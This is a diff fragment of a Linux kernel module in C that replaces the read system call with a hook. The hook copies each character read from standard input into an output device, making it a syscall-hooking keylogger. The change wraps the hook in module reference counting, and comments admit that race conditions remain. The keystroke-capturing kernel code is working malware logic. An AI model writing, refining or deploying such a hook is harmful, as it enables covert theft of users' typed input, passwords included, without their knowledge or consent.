@@ -17,24 +17,32 @@ struct page *syscallPageTemp;
 
 asmlinkage int (*originalRead)(int, void*, size_t);
 
-asmlinkage int readHook(int fd, void* buf, size_t nbytes)
-{
+
+asmlinkage int readHook(int fd, void* buf, size_t nbytes) {
 	int result;
-	result = (*originalRead)(fd, buf, nbytes);
-	if (fd==0)
-	{	
-		
-	//printk("\n");
-	//printk ("%c\n", (((char *) buf)[0]));
-		
-		{
-			char *bufferAsCharacterAnArray = (char *) buf;
-			char ch = bufferAsCharacterAnArray[0];
-			addCharacterToOutputDevice(ch);
+
+	//this will impact perfromance...
+	try_module_get(THIS_MODULE); // there is still a race condition e.g.. if something is going to call this function then it is removed..
+	
+	{
+		result = (*originalRead)(fd, buf, nbytes);
+		if (fd==0)
+		{	
+			
+		//printk("\n");
+		//printk ("%c\n", (((char *) buf)[0]));
+			
+			{
+				char *bufferAsCharacterAnArray = (char *) buf;
+				char ch = bufferAsCharacterAnArray[0];
+				addCharacterToOutputDevice(ch);
+			}
+			//printk("stdin read\n");
+		//printk("bytes read = %d\n", (int) nbytes);
 		}
-		//printk("stdin read\n");
-	//printk("bytes read = %d\n", (int) nbytes);
 	}
+	
+	module_put(THIS_MODULE); //  Decrement the usage count. there is a race condition on exit... as well...  
 	return result;
 } 
 
